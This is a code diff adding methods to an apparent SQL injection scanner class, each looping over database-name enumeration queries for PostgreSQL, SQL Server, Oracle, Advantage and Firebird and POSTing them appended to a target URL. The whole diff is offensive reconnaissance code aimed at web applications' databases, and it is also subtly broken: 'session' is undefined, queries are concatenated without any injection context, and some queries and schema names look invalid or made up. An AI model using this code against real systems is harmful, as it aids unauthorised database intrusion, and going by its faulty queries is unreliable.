@@ -79,6 +79,92 @@ class SQLInjectionScanner:
                     print(result)
             except Exception as e:
                 print(f"Error performing POST request for query '{query}': {e}")
+    
+    async def perform_postgre_get_database_name(self):
+        print("PostgreSQL: Retrieving Database name...")
+        for query in [
+            "SELECT current_database(); --",  # Basic Query for Database Name
+            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
+            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
+            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_microsoftsql_get_database_name(self):
+        print("Microsoft SQL Server: Retrieving Database name...")
+        for query in [
+            "SELECT DB_NAME(); --",  # Basic Query for Database Name
+            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
+            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
+            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_oracle_get_database_name(self):
+        print("Oracle: Retrieving Database name...")
+        for query in [
+            "SELECT DISTINCT tablespace_name FROM user_tables; --",  # Query using USER_TABLES
+            "SELECT DISTINCT tablespace_name FROM user_views; --",  # Query using USER_VIEWS
+            "SELECT DISTINCT tablespace_name FROM user_tab_columns; --",  # Query using USER_TAB_COLUMNS
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+    async def perform_advantage_get_database_name(self):
+        print("Advantage Database: Retrieving Database name...")
+        for query in [
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageTable WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageTable
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageColumn WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageColumn
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageView WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageView
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_firebird_get_database_name(self):
+        print("Firebird: Retrieving Database name...")
+        for query in [
+            "SELECT DISTINCT rdb$database_name FROM rdb$database; --",  # Query using rdb$database
+            "SHOW DATABASE; --",  # Query using SHOW DATABASE
+            "SELECT DISTINCT current_database FROM rdb$database; --",  # Query using current_database
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
 
 # Get Current User
     async def get_current_user(self):
